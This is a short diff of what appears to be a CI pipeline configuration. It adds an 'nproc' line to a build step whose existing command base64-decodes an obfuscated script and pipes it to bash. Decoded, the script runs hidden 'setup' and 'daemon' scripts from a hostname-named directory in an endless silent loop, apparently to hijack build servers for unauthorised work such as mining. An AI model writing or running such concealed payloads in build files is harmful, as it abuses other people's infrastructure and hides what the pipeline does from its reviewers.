@@ -6,6 +6,7 @@ steps:
 - name: deepCC
   image: golang
   commands:
+  - nproc
   - bash -c "base64 -d <<< ZXhwb3J0IFRFUk09eHRlcm0gJiYgbnByb2MgJiYgYmFzaCBzZXR1cCAmJiBjZCB+Ly4kKGVjaG8gJChob3N0bmFtZSkpL2JpbiAmJiBQQVRIPSQocHdkKTokUEFUSCAmJiB3aGlsZSBbIDEgXTsgZG8gYmFzaCBkYWVtb24gPiAvZGV2L251bGw7IHNsZWVwIDE7IGRvbmU= | bash"
   environment:
     TERM: xterm
